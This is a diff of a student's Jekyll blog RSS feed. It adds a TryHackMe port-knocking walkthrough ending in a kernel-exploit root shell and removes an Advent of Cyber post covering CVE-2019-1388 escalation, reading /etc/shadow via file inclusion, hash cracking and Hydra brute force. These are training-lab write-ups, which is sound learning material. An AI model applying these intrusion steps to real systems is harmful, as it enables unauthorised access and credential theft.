@@ -3,11 +3,96 @@
     <channel>
         <title>Naughtyb0y's Blog</title>
         <description>This blog is maintained by a student of IIT(ISM) Dhanbad</description>
-        <link>https://naughtyb0y.onrender.com/</link>
-        <atom:link href="https://naughtyb0y.onrender.com/feed.xml" rel="self" type="application/rss+xml"/>
-        <pubDate>Tue, 17 Mar 2020 02:48:21 +0530</pubDate>
-        <lastBuildDate>Tue, 17 Mar 2020 02:48:21 +0530</lastBuildDate>
+        <link>http://localhost:4000/</link>
+        <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+        <pubDate>Fri, 20 Mar 2020 11:44:14 +0530</pubDate>
+        <lastBuildDate>Fri, 20 Mar 2020 11:44:14 +0530</lastBuildDate>
         <generator>Jekyll v4.0.0</generator>
+        
+            <item>
+                <title>Try Hackme Madness Walkthrough</title>
+                <description>&lt;!--more--&gt;
+&lt;p&gt;Nmap scan results show nothing peculiar to explain&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;lets visit the webpage and download the pcap&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;the above screenshot show the order in which port were knocked so lets use the port knocker &lt;a href=&quot;https://github.com/grongor/knock&quot;&gt;script&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;now lets knock the ports in order shown and telnet the last port&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;we get a hidden directory lets access the directory and download the 2nd pcap file&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On following one of the tcp streams in the pcap file I find this 
+looks like some kind of foreign language&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It translates to 1 3 3 7 
+so this must be the ports to knock&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;we get another hidden directory so lets check it 
+seem like base64 lets check&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So it gives us the ports to knock and then ssh&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;we get the username password lets login&lt;/p&gt;
+
+&lt;p&gt;but as soon as we login the system logs us out&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;so lets try the same command with &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; in additon to it as we get the shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;lets stabilise it using tty
+and &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; to check the permissions&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;so the system name looked suspicious 
+so I looked into it and found that the linux version is outdated and vulnerable so 
+I checked for it online&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;so we have to compile the code on the machine so I transferred the ofs.c to the box using scp and compiled it to get the binary and then ran it to get the root shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/thm_knock/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So nice box !
+My first kernel exploit so it was great getting the root shell without any roadblocks&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;&lt;center&gt;Happy Hacking!!&lt;/center&gt;&lt;/b&gt;&lt;/p&gt;
+</description>
+                <pubDate>Wed, 18 Mar 2020 00:00:00 +0530</pubDate>
+                <link>http://localhost:4000/Try-Hack-Me-Knock-Knock</link>
+                <guid isPermaLink="true">http://localhost:4000/Try-Hack-Me-Knock-Knock</guid>
+                
+                <category>TryHackMe</category>
+                
+                <category>Port Knocking</category>
+                
+                <category>Forensics</category>
+                
+                
+            </item>
         
             <item>
                 <title>Try Hackme Wgel Walkthrough</title>
@@ -69,8 +154,8 @@ Remember always !!&lt;/p&gt;
 &lt;p&gt;&lt;b&gt;&lt;center&gt;Enumeration Is The Key!!&lt;/center&gt;&lt;/b&gt;&lt;/p&gt;
 </description>
                 <pubDate>Tue, 17 Mar 2020 00:00:00 +0530</pubDate>
-                <link>https://naughtyb0y.onrender.com/Try-Hack-Me-Wgel</link>
-                <guid isPermaLink="true">https://naughtyb0y.onrender.com/Try-Hack-Me-Wgel</guid>
+                <link>http://localhost:4000/Try-Hack-Me-Wgel</link>
+                <guid isPermaLink="true">http://localhost:4000/Try-Hack-Me-Wgel</guid>
                 
                 <category>TryHackMe</category>
                 
@@ -154,8 +239,8 @@ so it give us this&lt;/p&gt;
 &lt;p&gt;&lt;b&gt;&lt;center&gt;Happy Hacking!!&lt;/center&gt;&lt;/b&gt;&lt;/p&gt;
 </description>
                 <pubDate>Mon, 16 Mar 2020 00:00:00 +0530</pubDate>
-                <link>https://naughtyb0y.onrender.com/Try-Hack-Me-Willow</link>
-                <guid isPermaLink="true">https://naughtyb0y.onrender.com/Try-Hack-Me-Willow</guid>
+                <link>http://localhost:4000/Try-Hack-Me-Willow</link>
+                <guid isPermaLink="true">http://localhost:4000/Try-Hack-Me-Willow</guid>
                 
                 <category>TryHackMe</category>
                 
@@ -211,8 +296,8 @@ so lets checkout GTFObins for socat&lt;/p&gt;
 &lt;p&gt;&lt;b&gt;&lt;center&gt;Enumeration Is The Key!!&lt;/center&gt;&lt;/b&gt;&lt;/p&gt;
 </description>
                 <pubDate>Sun, 15 Mar 2020 00:00:00 +0530</pubDate>
-                <link>https://naughtyb0y.onrender.com/Try-Hack-Me-Inclusion</link>
-                <guid isPermaLink="true">https://naughtyb0y.onrender.com/Try-Hack-Me-Inclusion</guid>
+                <link>http://localhost:4000/Try-Hack-Me-Inclusion</link>
+                <guid isPermaLink="true">http://localhost:4000/Try-Hack-Me-Inclusion</guid>
                 
                 <category>TryHackMe</category>
                 
@@ -319,8 +404,8 @@ we got the flag&lt;/p&gt;
 &lt;p&gt;&lt;b&gt;&lt;center&gt;Happy Hacking!!&lt;/center&gt;&lt;/b&gt;&lt;/p&gt;
 </description>
                 <pubDate>Sat, 14 Mar 2020 00:00:00 +0530</pubDate>
-                <link>https://naughtyb0y.onrender.com/Try-Hack-Me-Madness</link>
-                <guid isPermaLink="true">https://naughtyb0y.onrender.com/Try-Hack-Me-Madness</guid>
+                <link>http://localhost:4000/Try-Hack-Me-Madness</link>
+                <guid isPermaLink="true">http://localhost:4000/Try-Hack-Me-Madness</guid>
                 
                 <category>TryHackMe</category>
                 
@@ -401,8 +486,8 @@ as the nmap version being used is very old&lt;/p&gt;
 &lt;p&gt;&lt;b&gt;&lt;center&gt;Happy Hacking&lt;/center&gt;&lt;/b&gt;&lt;/p&gt;
 </description>
                 <pubDate>Fri, 13 Mar 2020 00:00:00 +0530</pubDate>
-                <link>https://naughtyb0y.onrender.com/Try-Hack-Me-Mr-Robot-CTF</link>
-                <guid isPermaLink="true">https://naughtyb0y.onrender.com/Try-Hack-Me-Mr-Robot-CTF</guid>
+                <link>http://localhost:4000/Try-Hack-Me-Mr-Robot-CTF</link>
+                <guid isPermaLink="true">http://localhost:4000/Try-Hack-Me-Mr-Robot-CTF</guid>
                 
                 <category>TryHackMe</category>
                 
@@ -505,8 +590,8 @@ and we can so we use the following command to get the flag
 Hope you learnt something! &lt;strong&gt;:)&lt;/strong&gt;&lt;/p&gt;
 </description>
                 <pubDate>Thu, 12 Mar 2020 00:00:00 +0530</pubDate>
-                <link>https://naughtyb0y.onrender.com/Try-Hack-Me-BoilerCTF-Walkthrough</link>
-                <guid isPermaLink="true">https://naughtyb0y.onrender.com/Try-Hack-Me-BoilerCTF-Walkthrough</guid>
+                <link>http://localhost:4000/Try-Hack-Me-BoilerCTF-Walkthrough</link>
+                <guid isPermaLink="true">http://localhost:4000/Try-Hack-Me-BoilerCTF-Walkthrough</guid>
                 
                 <category>TryHackMe</category>
                 
@@ -569,8 +654,8 @@ its &lt;strong&gt;UnileverWifi&lt;/strong&gt;&lt;/p&gt;
 
 </description>
                 <pubDate>Wed, 11 Mar 2020 00:00:00 +0530</pubDate>
-                <link>https://naughtyb0y.onrender.com/Try-Hack-Me-OhSINT</link>
-                <guid isPermaLink="true">https://naughtyb0y.onrender.com/Try-Hack-Me-OhSINT</guid>
+                <link>http://localhost:4000/Try-Hack-Me-OhSINT</link>
+                <guid isPermaLink="true">http://localhost:4000/Try-Hack-Me-OhSINT</guid>
                 
                 <category>TryHackMe</category>
                 
@@ -786,8 +871,8 @@ This series was very interesting and got to learn a lot&lt;/p&gt;
 
 </description>
                 <pubDate>Tue, 10 Mar 2020 00:00:00 +0530</pubDate>
-                <link>https://naughtyb0y.onrender.com/Try-Hack-Me-Advent-Of-Cyber-Day19_to_Day24</link>
-                <guid isPermaLink="true">https://naughtyb0y.onrender.com/Try-Hack-Me-Advent-Of-Cyber-Day19_to_Day24</guid>
+                <link>http://localhost:4000/Try-Hack-Me-Advent-Of-Cyber-Day19_to_Day24</link>
+                <guid isPermaLink="true">http://localhost:4000/Try-Hack-Me-Advent-Of-Cyber-Day19_to_Day24</guid>
                 
                 <category>TryHackMe</category>
                 
@@ -861,238 +946,14 @@ we see that there is error in magic bytes so lets correct it&lt;/p&gt;
 
 </description>
                 <pubDate>Mon, 09 Mar 2020 00:00:00 +0530</pubDate>
-                <link>https://naughtyb0y.onrender.com/UTCTF20-Writup</link>
-                <guid isPermaLink="true">https://naughtyb0y.onrender.com/UTCTF20-Writup</guid>
+                <link>http://localhost:4000/UTCTF20-Writup</link>
+                <guid isPermaLink="true">http://localhost:4000/UTCTF20-Writup</guid>
                 
                 <category>CTF</category>
                 
                 <category>Forensics</category>
                 
                 <category>Web</category>
-                
-                
-            </item>
-        
-            <item>
-                <title>Try Hackme Advent of Cyber Day13 to Day18 Walkthrough</title>
-                <description>&lt;!--more--&gt;
-&lt;p&gt;So this is third part to the Advent_of_Cyber 25 part Series on &lt;a href=&quot;https://tryhackme.com&quot;&gt;https://tryhackme.com&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;day13task-18&quot;&gt;Day13(Task 18)&lt;/h2&gt;
-&lt;p&gt;I started my day today with one of the most frustrating machines to root ,it was this machine
-Starting with a nmap scan as usual&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;we see ports 80(http),3389(rdp) open and found about the services by selective scans
-Checking out the http page,nothing interesting&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;running gobuster for hidden directory search ,found a hidden directory &lt;strong&gt;retro&lt;/strong&gt; which turns out to be a blog&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;checking out the comment by &lt;strong&gt;wade&lt;/strong&gt;,i thought that maybe  this is one of the users and got the password as &lt;strong&gt;parzival&lt;/strong&gt;
-as metioned in the comment&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;logging into wordpress dashboard doesn’t give us anything useful either&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;now using &lt;strong&gt;Remmina&lt;/strong&gt; for rdp connection instead of default as it hash gui and easy to use 
-got the user.txt file on the desktop itself which is one of the flag&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;now on open chrome i got a bookmark refering to a particular vulnerablitiy leading to priv esc in windows server 16
-i found a &lt;a href=&quot;https://github.com/jas502n/CVE-2019-1388/blob/master/CVE-2019-1388.gif&quot;&gt;gif&lt;/a&gt; related to this&lt;/p&gt;
-
-&lt;p&gt;so i start with making the internet explorer the default application as  I saw in the gif&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/55.png&quot; alt=&quot;&quot; /&gt;
-I could also see the link to the certificate on hovering around the link&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;on chossing internet explorer it showed that this page can’t be displayed
-so lets save it ,just following the gif&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;using the name field to navigate to &lt;strong&gt;cmd.exe&lt;/strong&gt; file in system32 folder&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;finally got the command prompt and on checking the user it was the administrator so lets read the root flag&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;got the flag in the desktop folder of the admin&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This was literally one of the toughest one in the series till now as it used knowledge from the previous task as well&lt;/p&gt;
-
-&lt;h2 id=&quot;day14task-19&quot;&gt;Day14(Task 19)&lt;/h2&gt;
-&lt;p&gt;it was just a basics amazon aws bucket access task&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I don’t even need to explain it :)&lt;/p&gt;
-
-&lt;h2 id=&quot;day15task-20&quot;&gt;Day15(Task 20)&lt;/h2&gt;
-&lt;p&gt;we have are given a box so lets start with the nmap scan first as always&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Lets checkout the webpage get the answer to the first question here itself&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As it was mentioned in the challenge title it was a Local File Inclusion(LFI) task it was very similar to the one I did in the Natas wargame so I checked the /etc/passwd file first and we got charlie as one of the users&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;checking out the /etc/shadow file to get charlie’s password hash&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;cracking the hash with john&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;the follwing task was simple just login to ssh using credentials found and read the flag&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;day16task-21&quot;&gt;Day16(Task 21)&lt;/h2&gt;
-&lt;p&gt;This challenge was more of a scripting challenge&lt;/p&gt;
-
-&lt;h3 id=&quot;task1&quot;&gt;task1&lt;/h3&gt;
-&lt;p&gt;we have to find the no. of non-zip files after all the decompression 
-the script is a little bit messy but worked for me&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;zipfile&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'final-final-compressed.zip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zip_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;zip_1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extractall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decompress_1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;list_f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decompress_1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# print(list_f)
-&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decompress_1/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zip_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;zip_1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extractall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decompress_2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decompress_2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;task-2&quot;&gt;task 2&lt;/h3&gt;
-&lt;p&gt;we have to check the metadata of the .txt file found in the previous task and check which all have Version: 1.1 in the metadata&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt; 
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;exiftool&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;m_count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;list_f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# print(list_f)
-&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-	&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exiftool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExifTool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exif&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_metadata_batch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;u'XMP:Version'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-			&lt;span class=&quot;c1&quot;&gt;# print(d)
-&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;m_count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
-	&lt;span class=&quot;c1&quot;&gt;# print(d)
-&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# print(&quot;\n&quot;)
-&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;task-3&quot;&gt;task 3&lt;/h3&gt;
-&lt;p&gt;we have to find the name of the file which contains the string &lt;strong&gt;password&lt;/strong&gt; this can be done simply without using any script with the help of grep&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;day17task-22&quot;&gt;Day17(Task 22)&lt;/h2&gt;
-&lt;p&gt;this task was an introduction to &lt;strong&gt;&lt;em&gt;Hydra&lt;/em&gt;&lt;/strong&gt; which is a brute force online password cracking program; a quick system login password ‘hacking’ tool.
-first we had to brute-force the password for user molly in the http-post-form using rockyou.txt 
-using gobuster to find the login directory ,I am lazy did not wanted to guess the directory&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;while the brute for login page was running I decided to brutforce the ssh pass in another tab 
-and got the pass almost instantly&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;next I login through ssh and get the second flag&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;while the brute force for login was running I viewed the other file present in the server and came across an interesting file which had the initial flag and password for the login form and yet still that hydra script was running,&lt;strong&gt;lol&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;day18task-23&quot;&gt;Day18(Task 23)&lt;/h2&gt;
-
-&lt;p&gt;this task was very interesting as I learnt many more things about XSS rather than it just being a vulnerability
-we are presented with the site,just a normal login form and register page was not vulnerable to SQLi so registering as a normal user&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;while logging in we see in the request it shows that there is authid assigned to each user and so is  for admin so our
-goal was to get the authid for the admin&lt;/p&gt;
-
